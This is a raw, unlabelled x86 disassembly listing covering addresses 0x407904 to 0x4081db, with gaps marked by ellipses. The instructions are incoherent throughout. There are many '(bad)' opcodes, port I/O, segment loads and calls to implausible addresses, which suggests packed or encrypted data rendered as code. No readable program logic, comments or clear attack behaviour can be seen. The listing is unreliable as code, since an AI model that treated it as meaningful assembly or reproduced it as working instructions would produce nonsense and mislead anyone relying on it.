  407904:	fs jne 0x4078d6
  407907:	out    dx,al
  407908:	out    dx,al
  407909:	pop    es
  40790a:	mov    ebx,0xbcffa81b
  40790f:	adc    al,0x42
  407911:	add    al,0x63
  407913:	mov    eax,ds:0x29e2ec78
  407918:	dec    esp
  407919:	mul    DWORD PTR [esi+eax*8+0x7d9f4576]
  407920:	fs jne 0x40798a
  407923:	pop    ss
  407924:	das    
  407925:	push   ebp
  407926:	cmp    ch,BYTE PTR [ebp+0x4eee803]
  40792c:	js     0x407932
  40792e:	arpl   WORD PTR [ecx+ebp*1],cx
  407931:	cmc    
  407932:	fistp  QWORD PTR [eax+ebp*8]
  407935:	add    esp,DWORD PTR [ebx+0x48]
  407938:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407939:	imul   esp,DWORD PTR [ebx+0x5],0xffffffe9
  40793d:	add    esp,DWORD PTR [ecx+ecx*8]
  407940:	hlt    
  407941:	fs pop esp
  407943:	add    eax,0xed4cd9e9
  407948:	call   0xe92dbe26
  40794d:	jbe    0x4078f5
  40794f:	pop    ecx
  407950:	cmp    DWORD PTR [edi-0x22],esi
  407953:	pop    ecx
  407954:	fisub  WORD PTR [esp+ebp*1-0x4a]
  407958:	int    0xee
	...
  407966:	add    BYTE PTR [eax],al
  407968:	add    BYTE PTR [edi+ebx*2],ch
  40796b:	cmp    al,0x68
  40796d:	or     esp,edi
  40796f:	push   edi
  407970:	add    esp,DWORD PTR [ebx+0xa]
  407973:	test   eax,0x526c67ef
  407978:	add    ah,BYTE PTR [ebx+0x5]
  40797b:	adc    DWORD PTR [esi],edi
  40797d:	dec    ebx
  40797e:	(bad)  
  40797f:	call   0x8151e7e8
  407984:	jns    0x4079a7
  407986:	pop    edi
  407987:	mov    ss,ebx
  407989:	fnstenv ds:0x56d77e74
  40798f:	jle    0x4079f5
  407991:	xor    esi,DWORD PTR [ebx+0x5ea2e980]
  407997:	outs   dx,BYTE PTR ds:[esi]
  407998:	jp     0x407978
  40799a:	push   ebp
  40799b:	pop    esi
  40799c:	fs mov esp,0xb4a5396d
  4079a2:	pop    esi
  4079a3:	ret    
  4079a4:	add    edi,DWORD PTR [ebx]
  4079a6:	int    0x16
  4079a8:	ret    
  4079a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079aa:	pop    edi
  4079ab:	jl     0x407a20
  4079ad:	xchg   esp,eax
  4079ae:	pop    esi
  4079af:	ds fs dec esi
  4079b2:	mov    eax,0x5ea0ffff
  4079b7:	out    0x19,eax
  4079b9:	and    DWORD PTR [esi-0x1],ebx
  4079bc:	jo     0x4079bb
  4079be:	push   0xeaff1ef7
  4079c3:	inc    DWORD PTR [eax-0x16bee766]
  4079c9:	call   DWORD PTR [edi+0xfef0]
	...
  4079db:	add    al,al
  4079dd:	pop    esi
  4079de:	push   DWORD PTR [ebp+eiz*1-0x5716bed3]
  4079e5:	xchg   ebx,eax
  4079e6:	shr    esi,0xc0
  4079e9:	mov    WORD PTR [ebp-0xa1672b],es
  4079ef:	push   ebx
  4079f0:	pop    edi
  4079f1:	in     eax,dx
  4079f2:	push   eax
  4079f3:	pop    ds
  4079f4:	es pop esi
  4079f6:	(bad)  
  4079f7:	xchg   esp,eax
  4079f8:	(bad)  
  4079f9:	push   esi
  4079fa:	inc    esi
  4079fc:	sbb    BYTE PTR [eax],0x55
  4079ff:	adc    BYTE PTR [esi],bl
  407a01:	pop    esi
  407a02:	out    0x5d,eax
  407a04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a05:	pop    esi
  407a06:	jmp    DWORD PTR [eax-0x26]
  407a09:	ins    BYTE PTR es:[edi],dx
  407a0a:	mul    DWORD PTR [esi+0x10ffeb80]
  407a10:	cld    
  407a11:	pop    ss
  407a12:	inc    ecx
  407a13:	jmp    0x97311299
  407a18:	sbb    BYTE PTR [esi-0x1],0xbc
  407a1c:	sbb    ebp,DWORD PTR ds:0xd748e941
  407a22:	shl    BYTE PTR [esi+0x40],0x8c
  407a26:	test   DWORD PTR [ecx+0x74ff5e28],ecx
  407a2c:	jmp    0x67b5:0x405ef73c
  407a33:	les    ecx,FWORD PTR [edx-0x3c]
  407a36:	dec    DWORD PTR [ebp-0x36]
  407a39:	push   esp
  407a3a:	test   DWORD PTR [eax],0x35fee225
	...
  407a4c:	add    BYTE PTR [eax],al
  407a4e:	add    bh,ch
  407a50:	xor    BYTE PTR [ecx+0x0],al
  407a53:	and    dl,BYTE PTR [esi+0xe35ffc0]
  407a59:	shl    BYTE PTR [ebx+eiz*2-0x7a],0xbd
  407a5e:	fmul   DWORD PTR [ebp-0x1e]
  407a61:	inc    BYTE PTR [edi+ecx*8]
  407a64:	push   ecx
  407a65:	(bad)  
  407a66:	xor    BYTE PTR ds:0x65f7dc8c,al
  407a6c:	call   0xa76b62c0
  407a71:	(bad)  
  407a72:	jmp    DWORD PTR [ecx+0x5d]
  407a75:	or     al,al
  407a77:	into   
  407a78:	push   cs
  407a79:	push   eax
  407a7a:	call   0x4021bd
  407a7f:	std    
  407a80:	(bad)  
  407a81:	fdivr  st(7),st
  407a83:	adc    eax,0x3a0014e8
  407a88:	or     DWORD PTR [ebx-0x13fd143],eax
  407a8e:	dec    DWORD PTR [edx]
  407a90:	xor    eax,0xec978364
  407a95:	idiv   bh
  407a97:	mov    ch,0x8
  407a99:	je     0x407af7
  407a9b:	mov    DWORD PTR [ebp-0x182a0818],esp
  407aa1:	push   DWORD PTR [ebx+0x29]
  407aa4:	imul   edi,edi,0xffa665ff
  407aaa:	jne    0x407a7e
  407aac:	lock push 0xffffffba
  407aaf:	push   ebp
  407ab0:	out    0xfe,eax
  407ab2:	mov    ch,0x0
	...
  407ac0:	add    BYTE PTR [eax],al
  407ac2:	out    0xbf,al
  407ac4:	(bad)  
  407ac5:	push   DWORD PTR ds:0x5e8073d
  407acb:	jnp    0x407acc
  407acd:	call   DWORD PTR ds:0x63f7e87d
  407ad3:	mov    bl,0x61
  407ad5:	jmp    FWORD PTR [esi]
  407ad7:	imul   si,WORD PTR [ecx-0x9e3c27],0xffce
  407adf:	ret    0xff59
  407ae2:	mov    WORD PTR [ebx],ss
  407ae4:	fadd   DWORD PTR [edi]
  407ae6:	jnp    0x407a77
  407ae8:	popf   
  407ae9:	(bad)  
  407aea:	jl     0x407b0f
  407aec:	cwde   
  407aed:	loopne 0x407b5b
  407aef:	sti    
  407af0:	popa   
  407af1:	push   esi
  407af3:	imul   edx,DWORD PTR gs:[ebp-0x9df457],0x16
  407afb:	and    bl,BYTE PTR [edx-0x1]
  407afe:	push   esp
  407aff:	pop    ebx
  407b00:	xlat   BYTE PTR ds:[ebx]
  407b01:	pop    es
  407b02:	cmp    ecx,DWORD PTR [ecx-0x63]
  407b05:	inc    DWORD PTR [ebx+ebp*2-0x69]
  407b09:	in     al,0x34
  407b0b:	arpl   WORD PTR [ecx-0x18],sp
  407b0e:	sar    BYTE PTR [eax+0x61],cl
  407b11:	jmp    FWORD PTR [ecx+edi*2]
  407b14:	jo     0x407b0d
  407b16:	and    al,0x4b
  407b18:	ins    BYTE PTR es:[edi],dx
  407b19:	xchg   dh,bl
  407b1b:	inc    edx
  407b1c:	popa   
  407b1d:	dec    esi
  407b1f:	xor    eax,0x460cff59
  407b24:	fnstsw WORD PTR [eax+eax*1+0x0]
	...
  407b33:	add    BYTE PTR [eax],al
  407b35:	add    al,0xab
  407b37:	popa   
  407b38:	mov    ch,0x3
  407b3a:	jnp    0x407b9d
  407b3c:	dec    DWORD PTR [ebx]
  407b3e:	(bad)  
  407b3f:	sahf   
  407b40:	(bad)  
  407b41:	in     al,dx
  407b42:	jb     0x407adb
  407b44:	lock in al,dx
  407b46:	mov    ah,BYTE PTR [ecx-0x18]
  407b49:	inc    esi
  407b4a:	shl    DWORD PTR [eax-0x1],0xd4
  407b4e:	and    BYTE PTR [ecx+ebp*8-0x6c],bl
  407b52:	aam    0x60
  407b54:	inc    esp
  407b56:	push   eax
  407b57:	pop    edi
  407b58:	call   0x4b68069
  407b5d:	arpl   WORD PTR [esi+0x2b],cx
  407b60:	or     al,0x63
  407b62:	mov    dl,0x61
  407b64:	jo     0x407b46
  407b66:	inc    eax
  407b67:	push   ecx
  407b68:	out    dx,al
  407b69:	pushf  
  407b6a:	in     eax,dx
  407b6b:	icebp  
  407b6c:	pusha  
  407b6d:	push   cs
  407b6e:	or     eax,0x5bcad951
  407b73:	mov    ebx,DWORD PTR ss:[esi]
  407b76:	pop    ecx
  407b77:	pop    esp
  407b78:	(bad)  
  407b79:	je     0x407b2f
  407b7b:	nop
  407b7c:	push   cs
  407b7d:	sub    eax,0x6bebe8c6
  407b82:	adc    DWORD PTR [eax-0x4bee9bfd],ebp
  407b88:	sub    ah,BYTE PTR [edx+0x231d1105]
  407b8e:	pop    ebx
  407b8f:	dec    BYTE PTR [ebx+eiz*1]
  407b92:	rcr    ch,cl
  407b94:	mov    bl,0xbc
  407b96:	add    al,0xe9
  407b98:	jo     0x407b9a
	...
  407ba6:	add    BYTE PTR [eax],al
  407ba8:	std    
  407ba9:	pop    edx
  407baa:	pop    esp
  407bab:	pop    esp
  407bac:	xchg   ebx,eax
  407bad:	pop    edx
  407bae:	push   esp
  407baf:	or     al,0x3b
  407bb1:	test   al,0xb7
  407bb3:	pusha  
  407bb4:	and    al,0x6e
  407bb6:	loope  0x407b56
  407bb8:	sbb    al,0x5b
  407bba:	je     0x407b82
  407bbc:	or     al,0xb6
  407bbe:	push   eax
  407bbf:	add    BYTE PTR [ebp-0x3c],dl
  407bc2:	call   0x285187b2
  407bc7:	add    al,0xfc
  407bc9:	adc    BYTE PTR [ebx+ebp*1],bh
  407bcc:	mov    ds:0x23089105,al
  407bd1:	pop    ebx
  407bd2:	xchg   esi,eax
  407bd3:	or     al,0x23
  407bd5:	shl    ch,cl
  407bd7:	mov    bl,0x44
  407bd9:	pop    es
  407bda:	jmp    0xf49b914f
  407bdf:	pop    ebx
  407be0:	xor    ebx,DWORD PTR [edx+0x0]
  407be3:	cld    
  407be4:	pop    eax
  407be5:	ins    DWORD PTR es:[edi],dx
  407be6:	outs   dx,BYTE PTR ds:[esi]
  407be7:	pop    DWORD PTR [ebx+0x5a]
  407bea:	call   0xff9b502c
  407bef:	sar    DWORD PTR [ebx+edx*1+0x41],1
  407bf3:	jmp    0x41484c3b
  407bf8:	mov    ebx,0x346ff59
  407bfd:	sar    bl,1
  407bff:	ds mov ch,0x2
  407c02:	call   0xff9b62fa
  407c07:	and    BYTE PTR [esi],ah
  407c09:	add    DWORD PTR [eax],eax
  407c0b:	mov    esp,0x0
	...
  407c18:	add    BYTE PTR [eax],al
  407c1a:	add    bh,ah
  407c1c:	imul   eax,DWORD PTR [ecx-0xadd3db],0xfbc0d516
  407c26:	mov    ecx,0x60bd0c3
  407c2b:	ins    DWORD PTR es:[edi],dx
  407c2c:	mov    al,0x28
  407c2e:	test   al,0x60
  407c30:	ins    DWORD PTR es:[edi],dx
  407c31:	std    
  407c32:	addr16 pusha 
  407c34:	add    eax,0x8053290b
  407c39:	shr    eax,0x60
  407c3c:	add    eax,0x58f24c7
  407c41:	add    cl,ch
  407c43:	pusha  
  407c44:	inc    edx
  407c45:	inc    ebp
  407c46:	aad    0xbc
  407c48:	add    al,BYTE PTR [eax]
  407c4a:	jmp    0xe9a9d659
  407c4f:	cli    
  407c50:	pop    ecx
  407c51:	imul   ebp,ecx,0x19f3bff3
  407c57:	sar    BYTE PTR [edi-0xc],cl
  407c5a:	sahf   
  407c5b:	xchg   esp,eax
  407c5c:	pop    edx
  407c5d:	push   eax
  407c5e:	sahf   
  407c5f:	or     dl,BYTE PTR [edx-0x1]
  407c62:	sbb    al,0x83
  407c64:	ins    DWORD PTR es:[edi],dx
  407c65:	iret   
  407c66:	pop    edi
  407c67:	addr16 add eax,0x3d0a000b
  407c6d:	add    al,0xe9
  407c6f:	inc    esi
  407c70:	add    BYTE PTR [eax],al
  407c72:	add    BYTE PTR [edx-0x3d],ah
  407c75:	daa    
  407c76:	inc    ecx
  407c77:	retf   0x74ba
  407c7a:	or     al,0x12
  407c7c:	mov    bh,0xbe
  407c7e:	inc    DWORD PTR [eax]
	...
  407c8c:	add    BYTE PTR [eax],al
  407c8e:	or     eax,0x3fd08a91
  407c93:	mov    esp,?
  407c95:	imul   DWORD PTR ds:0x32524fba
  407c9b:	out    0xbe,eax
  407c9d:	dec    DWORD PTR [ebp-0x78]
  407ca0:	test   eax,esi
  407ca2:	inc    ebp
  407ca3:	mov    edx,0x7972e8fe
  407ca8:	(bad)  
  407ca9:	call   eax
  407cab:	add    eax,0x40948968
  407cb0:	(bad)  
  407cb1:	inc    BYTE PTR [edi]
  407cb3:	mov    cl,0xf6
  407cb5:	jmp    FWORD PTR [ebp-0x48]
  407cb8:	xor    al,0x55
  407cba:	xor    eax,DWORD PTR [edx-0x1]
  407cbd:	out    0x22,eax
  407cbf:	js     0x407cc0
  407cc1:	inc    ebx
  407cc3:	mov    fs,esp
  407cc5:	test   DWORD PTR [ebp-0x48],0x33920069
  407ccc:	xor    eax,0xb4b83a41
  407cd1:	lock add eax,0x77fffeb8
  407cd7:	sahf   
  407cd8:	sub    BYTE PTR [ecx+0xa],al
  407cdb:	in     eax,dx
  407cdc:	sbb    DWORD PTR [edi-0x7a774833],edi
  407ce2:	push   ds
  407ce3:	mov    al,0xfe
  407ce5:	jmp    DWORD PTR [eax+0x147b6801]
  407ceb:	inc    edx
  407cec:	(bad)  
  407ced:	(bad)  
  407cee:	xchg   edi,eax
  407cef:	mov    ah,0xf6
  407cf1:	inc    DWORD PTR [eax]
	...
  407cff:	add    BYTE PTR [eax],al
  407d01:	arpl   WORD PTR [edi+0x5e],bp
  407d04:	xor    eax,0xffc44536
  407d09:	mov    esp,0xccff9d82
  407d0e:	aad    0x87
  407d10:	loopne 0x407cde
  407d12:	iret   
  407d13:	pop    ebp
  407d14:	push   0x63
  407d16:	push   es
  407d17:	test   BYTE PTR [esi],dh
  407d19:	and    ch,BYTE PTR [esi+0x5e]
  407d1c:	mov    ch,0xb3
  407d1e:	scas   eax,DWORD PTR es:[edi]
  407d1f:	pop    ebp
  407d20:	jmp    DWORD PTR [ecx+edi*8+0x6e2228b8]
  407d27:	imul   ebx,esi,0xffffffd5
  407d2a:	mov    edi,0xb6e6895d
  407d2f:	push   ebp
  407d30:	inc    DWORD PTR [esp+eax*2+0x50d16803]
  407d37:	(bad)  
  407d38:	push   DWORD PTR [ebp-0x47]
  407d3b:	push   edx
  407d3c:	imul   DWORD PTR [edi+esi*8+0x5d]
  407d40:	xor    eax,0xffc4450e
  407d45:	inc    esp
  407d46:	cs popf 
  407d48:	call   DWORD PTR [ebp+edx*8-0x79]
  407d4c:	fcom   QWORD PTR [edi+edx*2+0x5d]
  407d50:	add    DWORD PTR [esi],0xa
  407d53:	push   esi
  407d54:	(bad)  
  407d55:	cmp    al,0x6e
  407d57:	xlat   BYTE PTR ds:[ebx]
  407d58:	fs loopne 0x407cfb
  407d5b:	jo     0x407d54
  407d5d:	sub    al,0x37
  407d5f:	add    al,0x74
  407d61:	xchg   ebx,ebp
  407d63:	sahf   
  407d64:	call   0x407d69
	...
  407d71:	add    BYTE PTR [eax],al
  407d73:	add    BYTE PTR [edi+eax*2],dl
  407d76:	pop    ebp
  407d77:	add    BYTE PTR [edi+0xcffebfb],cl
  407d7d:	inc    edi
  407d7e:	sahf   
  407d7f:	dec    DWORD PTR [esi-0x44fc949a]
  407d85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d86:	pop    ebp
  407d87:	jmp    FWORD PTR [esi-0x13aa6afc]
  407d8d:	push   edi
  407d8e:	sahf   
  407d8f:	xlat   BYTE PTR ds:[ebx]
  407d90:	pop    esp
  407d91:	ins    DWORD PTR es:[edi],dx
  407d92:	ds pushf 
  407d94:	fcom   QWORD PTR [edi-0x72]
  407d97:	xchg   edi,eax
  407d98:	retf   
  407d99:	dec    edi
  407d9a:	xchg   BYTE PTR [ebp-0x34],bl
  407d9d:	shl    eax,1
  407d9f:	imul   ebx,DWORD PTR [edx],0xffffff9d
  407da2:	jbe    0x407e01
  407da4:	mov    esp,0xb4558591
  407da9:	push   edi
  407daa:	data16 xlat BYTE PTR ds:[ebx]
  407dac:	fs ins DWORD PTR es:[edi],dx
  407dae:	and    bl,BYTE PTR [esp+eiz*4-0x7c68a9a9]
  407db5:	dec    edi
  407db6:	dec    esi
  407db7:	pop    ebp
  407db8:	xchg   esp,eax
  407db9:	shl    eax,1
  407dbb:	imul   edi,DWORD PTR [esi],0xffffff9d
  407dbe:	ds pop ebp
  407dc0:	test   BYTE PTR [ecx+0x577c5515],dl
  407dc6:	xlat   BYTE PTR cs:[ebx]
  407dc8:	pop    esp
  407dc9:	ins    DWORD PTR es:[edi],dx
  407dca:	push   es
  407dcb:	pushf  
  407dcc:	ins    BYTE PTR es:[edi],dx
  407dcd:	push   edi
  407dce:	push   ds
  407dcf:	xchg   edi,eax
  407dd0:	jg     0x407e21
  407dd2:	push   ss
  407dd3:	pop    ebp
  407dd4:	dec    ebx
  407dd5:	sub    eax,0x5d52
	...
  407de6:	add    BYTE PTR [edi+edx*2+0x3c],dl
  407dea:	jo     0x407e40
  407dec:	push   edi
  407ded:	(bad)  
  407dee:	imul   esp,DWORD PTR [ebp-0x66],0xfffffff6
  407df2:	pop    esp
  407df3:	cmp    al,0x91
  407df5:	add    DWORD PTR [ebp+0x34],edx
  407df8:	push   edi
  407df9:	shl    eax,1
  407dfb:	jmp    0xee9d5c56
  407e00:	ficomp WORD PTR gs:[esp+ebx*1+0x6e]
  407e05:	loope  0x407d9f
  407e07:	adc    al,0x57
  407e09:	(bad)  
  407e0a:	xchg   esi,eax
  407e0b:	das    
  407e0c:	dec    edi
  407e0d:	mov    esi,0x58fb5c
  407e12:	jae    0x407db3
  407e14:	push   esi
  407e15:	push   DWORD PTR [eax+edx*4+0x4e]
  407e19:	jmp    DWORD PTR [esi-0x6ef82f71]
  407e1f:	dec    edi
  407e20:	push   edi
  407e21:	call   DWORD PTR [esi-0x690f6fc1]
  407e27:	aaa    
  407e28:	push   esi
  407e29:	call   0xff9768bb
  407e2e:	jle    0x407dcd
  407e30:	dec    esi
  407e31:	jmp    0xff969b5d
  407e36:	outs   dx,BYTE PTR ds:[esi]
  407e37:	lea    ebx,[edx-0x18]
  407e3a:	pop    ss
  407e3b:	fadd   QWORD PTR ds:0xd223000
  407e41:	add    BYTE PTR [ebx+ebp*8+0x34258369],bh
  407e48:	jmp    0x407e49
  407e4a:	rol    BYTE PTR [eax],cl
	...
  407e58:	add    BYTE PTR [eax],al
  407e5a:	pop    esp
  407e5b:	push   esi
  407e5c:	jne    0x407e4f
  407e5e:	clc    
  407e5f:	dec    esi
  407e60:	mov    bh,0x36
  407e62:	pop    ds
  407e63:	mov    WORD PTR [ebp+0x2d],es
  407e66:	mov    BYTE PTR [eax+0x36],bh
  407e69:	test   al,0x60
  407e6b:	push   esi
  407e6c:	jne    0x407e5f
  407e6e:	clc    
  407e6f:	dec    esi
  407e70:	std    
  407e71:	push   ss
  407e72:	mov    edi,0xb70d7556
  407e77:	rol    BYTE PTR [edi],1
  407e79:	adc    DWORD PTR [ecx-0x65010063],eax
  407e7f:	inc    ebx
  407e80:	add    al,0xe9
  407e82:	cmc    
  407e83:	mov    ch,ah
  407e85:	push   0xe6f7359c
  407e8a:	mov    BYTE PTR [eax+0x56efdd45],cl
  407e90:	jne    0x407e77
  407e92:	mov    ecx,0x1e005510
  407e97:	push   esi
  407e98:	out    0x0,eax
  407e9a:	push   ds
  407e9b:	lea    eax,[eax]
  407e9d:	add    BYTE PTR [ecx],dl
  407e9f:	ret    0x850e
  407ea2:	lock (bad) 
  407ea4:	(bad)  
  407ea5:	(bad)  
  407ea6:	mov    ebp,0xfa00f743
  407eab:	add    DWORD PTR [eax],eax
  407ead:	(bad)  
  407eae:	aas    
  407eaf:	mov    ch,0xfe
  407eb1:	pop    es
  407eb2:	retf   0x6a01
  407eb5:	add    BYTE PTR [eax+0x1],ah
  407eb8:	push   0x0
  407eba:	jo     0x407ebd
  407ebc:	lea    eax,[ebp+0x0]
	...
  407ecb:	add    BYTE PTR [eax],al
  407ecd:	dec    esi
  407ece:	xchg   ecx,eax
  407ecf:	mov    WORD PTR [ebp-0x14dc2],es
  407ed5:	pop    edx
  407ed6:	mov    edx,0x3445f874
  407edb:	sti    
  407edc:	call   0x410bad
  407ee1:	add    ecx,0xbc230573
  407ee7:	add    BYTE PTR [eax],al
  407ee9:	jp     0x407f54
  407eeb:	lds    ebp,FWORD PTR [eax]
  407eed:	mov    ebx,0x8675ff01
  407ef2:	jmp    0xba863ccf
  407ef7:	mov    dl,al
  407ef9:	test   DWORD PTR [ebx-0x45ba080c],0x4f62524f
  407f03:	mov    ebp,0x858265ff
  407f08:	lock dec ebp
  407f0a:	mov    al,0xfe
  407f0c:	push   0x3a
  407f0e:	popa   
  407f0f:	stc    
  407f10:	or     ecx,DWORD PTR ss:[ecx]
  407f13:	push   DWORD PTR [ebp-0x147c6]
  407f19:	inc    ebp
  407f1a:	not    BYTE PTR [ecx+ebp*1+0x7b]
  407f1e:	or     eax,ebp
  407f20:	and    eax,0xff5a7963
  407f25:	jmp    0xed4c:0xcf75ee9
  407f2c:	(bad)  
  407f2d:	jl     0x407f66
  407f2f:	adc    DWORD PTR [ecx+0x0],eax
	...
  407f3e:	add    BYTE PTR [eax],al
  407f40:	arpl   WORD PTR [ebx-0x5c130f70],bx
  407f46:	pop    edx
  407f47:	push   DWORD PTR [esi]
  407f49:	adc    DWORD PTR ds:0x2766341,ebp
  407f4f:	mov    ebp,0x858c7bdc
  407f54:	(bad)  
  407f55:	jnp    0x407fb1
  407f57:	(bad)  
  407f58:	cmp    DWORD PTR [esi-0x15],ebx
  407f5b:	out    dx,eax
  407f5c:	lea    ebx,ds:0xcef6ff04
  407f62:	push   ecx
  407f63:	push   DWORD PTR [ebx+eiz*8-0x6285aaf1]
  407f6a:	add    ebp,eax
  407f6c:	mov    edx,0xeaff5a72
  407f71:	loope  0x407fdd
  407f73:	not    DWORD PTR [ebx+eax*8-0x36fb0014]
  407f7a:	adc    BYTE PTR [ecx+0x63],al
  407f7d:	adc    edx,DWORD PTR [eax+0x5a1b74f0]
  407f83:	jmp    FWORD PTR [esi]
  407f85:	jns    0x407fb3
  407f87:	inc    ecx
  407f88:	arpl   si,si
  407f8a:	dec    ebp
  407f8b:	mov    esp,0x858bf364
  407f90:	inc    ebx
  407f91:	repz pop ecx
  407f93:	jmp    esi
  407f95:	call   0xb8d76c8
  407f9a:	mov    bl,0x67
  407f9c:	dec    esi
  407f9d:	pushf  
  407f9e:	(bad)  
  407f9f:	(bad)  
  407fa0:	cmp    eax,0xf75311
	...
  407fb1:	add    BYTE PTR [eax],al
  407fb3:	xor    al,0x63
  407fb5:	pop    ecx
  407fb6:	xor    eax,0xc3100596
  407fbb:	and    al,0x6c
  407fbd:	xchg   ecx,eax
  407fbe:	cwde   
  407fbf:	sbb    al,0x54
  407fc1:	loop   0x408006
  407fc3:	(bad)  
  407fc4:	out    dx,al
  407fc5:	imul   edx,DWORD PTR [edi+0x59c65c37],0x58d8da5f
  407fcf:	xor    eax,DWORD PTR [esp+ebp*2-0x51ac13c8]
  407fd6:	mov    ah,0x4
  407fd8:	ficomp DWORD PTR [edi+0x59]
  407fdb:	in     al,0x5f
  407fdd:	cmc    
  407fde:	or     al,0xa3
  407fe0:	fsubr  st,st(6)
  407fe2:	mov    bl,0xbc
  407fe4:	fisttp QWORD PTR [edi+0x59]
  407fe7:	int3   
  407fe8:	dec    ebx
  407fe9:	ins    BYTE PTR es:[edi],dx
  407fea:	cmp    ah,cl
  407fec:	push   ebx
  407fed:	jle    0x407fde
  407fef:	mov    esp,0xde86e953
  407ff4:	xor    al,0x76
  407ff6:	pop    ecx
  407ff7:	lods   al,BYTE PTR ds:[esi]
  407ff8:	mov    ah,0xd0
  407ffa:	add    eax,0x58e8c66c
  407fff:	(bad)  
  408000:	push   esp
  408001:	pop    esi
  408002:	pop    ecx
  408003:	xchg   esp,eax
  408004:	push   ebx
  408005:	adc    al,0xaf
  408007:	cmp    eax,esi
  408009:	call   0x3ed1a979
  40800e:	pop    ecx
  40800f:	jmp    0x6a53:0x74511189
  408016:	xchg   edi,eax
	...
  408023:	add    BYTE PTR [eax],al
  408025:	add    BYTE PTR [edi+0x6359265b],al
  40802b:	add    al,0x65
  40802d:	jge    0x408092
  40802f:	add    eax,0x621684e9
  408034:	push   ss
  408035:	pop    ecx
  408036:	dec    esp
  408037:	push   es
  408038:	idiv   BYTE PTR [edi-0x2b]
  40803b:	add    eax,0x90e003e9
  408040:	add    BYTE PTR [ecx],al
  408042:	xchg   edx,eax
  408043:	push   edx
  408044:	(bad)  
  408045:	jmp    0xe9c209a5
  40804a:	pusha  
  40804b:	add    eax,0x6260f968
  408050:	mov    esi,0xe80b25d6
  408055:	js     0x408034
  408057:	push   edx
  408058:	inc    esi
  40805a:	aad    0x61
  40805c:	idiv   DWORD PTR [esi-0x1e8aad65]
  408062:	mov    BYTE PTR [eax-0x4b],ch
  408065:	scas   al,BYTE PTR es:[edi]
  408066:	mov    edx,DWORD PTR [edx-0x4b]
  408069:	xchg   ecx,eax
  40806a:	xchg   ebx,eax
  40806b:	push   edx
  40806c:	call   FWORD PTR [esi-0x4117f553]
  408072:	in     eax,0x52
  408074:	dec    DWORD PTR [esi-0x79089623]
  40807a:	sub    edx,DWORD PTR [edx+0x75]
  40807d:	icebp  
  40807e:	dec    eax
  40807f:	cmp    al,0xb5
  408081:	jbe    0x40809e
  408083:	push   edx
  408084:	mov    ch,0x8d
  408086:	adc    edx,DWORD PTR [edx-0x1]
  408089:	data16 add BYTE PTR [eax],al
	...
  408098:	add    BYTE PTR [ebp-0x123f17f6],dl
  40809e:	push   edx
  40809f:	call   DWORD PTR [esi-0x1b]
  4080a2:	test   DWORD PTR gs:[esi+0x2b],0xf8f17552
  4080aa:	lahf   
  4080ab:	mov    ch,0x3e
  4080ad:	sbb    eax,DWORD PTR [esi+0x521311bd]
  4080b3:	(bad)  
  4080b4:	jmp    0x64c37055
  4080b9:	xor    BYTE PTR [edx-0x1],bl
  4080bc:	push   ds
  4080bd:	pop    esp
  4080be:	fst    DWORD PTR [ecx]
  4080c0:	(bad)  
  4080c1:	aad    0x2d
  4080c3:	test   DWORD PTR [esi],0x3052ab
  4080c9:	pop    ebp
  4080ca:	inc    ebx
  4080cb:	pop    es
  4080cc:	call   0x4003e4
  4080d1:	popa   
  4080d2:	add    BYTE PTR [edx+0x0],ch
  4080d5:	cmp    eax,0x5fe80740
  4080da:	je     0x4080db
  4080dc:	(bad)  
  4080dd:	cmp    eax,0x2df7e474
  4080e2:	mov    edx,0xb9f289e7
  4080e7:	(bad)  
  4080e8:	inc    DWORD PTR [edi-0x42000923]
  4080ee:	loopne 0x40816d
  4080f0:	mov    eax,0xb5feb9ad
  4080f5:	and    al,dl
  4080f7:	(bad)  
  4080f8:	call   edx
  4080fa:	xor    eax,0xffb7
	...
  40810b:	add    ch,bh
  40810d:	mov    ecx,0xb9f5e0b4
  408112:	(bad)  
  408113:	call   0x3ff27a
  408118:	fnsave [ebx-0x28]
  40811b:	idiv   DWORD PTR ds:0x725de7ba
  408121:	mov    edx,0xb977fffe
  408126:	idiv   bh
  408128:	cmp    eax,0x3db851e1
  40812d:	mov    edx,0xe03245fe
  408132:	aam    0xfd
  408134:	sbb    eax,0x1e75feba
  408139:	loope  0x4080d6
  40813b:	mov    cl,BYTE PTR [edx-0x7d3d36fb]
  408141:	add    eax,0x862e8b55
  408146:	(bad)  
  408147:	cld    
  408148:	rol    BYTE PTR ds:0x367d0d6a,1
  40814e:	pop    es
  40814f:	call   0xffd103b7
  408154:	dec    esp
  408155:	out    0xc0,al
  408157:	sti    
  408158:	mov    ebx,0x63410e1a
  40815d:	dec    edi
  40815e:	rol    BYTE PTR [edi],1
  408160:	dec    ebx
  408161:	ficom  DWORD PTR [edi-0x1]
  408164:	sub    al,0x60
  408166:	sar    bl,1
  408168:	and    al,0xb2
  40816a:	or     ebp,eax
  40816c:	in     al,dx
  40816d:	jns    0x4081c5
  40816f:	inc    DWORD PTR [eax]
	...
  40817d:	add    BYTE PTR [eax],al
  40817f:	sub    bl,BYTE PTR [ebp-0x1c480001]
  408185:	sbb    WORD PTR [edi],0x4e9b
  40818a:	(bad)  
  40818b:	cld    
  40818c:	loope  0x40814d
  40818e:	sti    
  40818f:	xchg   ebx,eax
  408190:	xchg   edi,eax
  408191:	ror    BYTE PTR [ebx],1
  408193:	in     al,dx
  408194:	pop    ecx
  408195:	mov    al,0x28
  408197:	mov    ds:0xe9526b5e,al
  40819c:	pop    esi
  40819d:	add    ecx,DWORD PTR [ebx]
  40819f:	mov    ds:0x615f8067,eax
  4081a4:	pop    esi
  4081a5:	add    eax,edi
  4081a7:	push   ds
  4081a8:	xchg   BYTE PTR [ebx],al
  4081aa:	add    BYTE PTR [ebx+0x5e],ah
  4081ad:	ds inc ebp
  4081af:	scas   eax,DWORD PTR es:[edi]
  4081b0:	xlat   BYTE PTR ds:[ebx]
  4081b1:	std    
  4081b2:	jmp    FWORD PTR [esp+eax*1+0x34636a04]
  4081b9:	add    ebp,DWORD PTR [edx+0x63]
  4081bc:	loope  0x40817d
  4081be:	repz xor ebp,ecx
  4081c1:	jg     0x4081b7
  4081c3:	xchg   esp,eax
  4081c4:	mov    edi,0x91845055
  4081c9:	pop    ebx
  4081ca:	push   esi
  4081cc:	adc    DWORD PTR [ebx+0x24],ebp
  4081cf:	jmp    0xa34b8532
  4081d4:	call   0x3eb:0x541e900
  4081db:	arpl   bp,bx
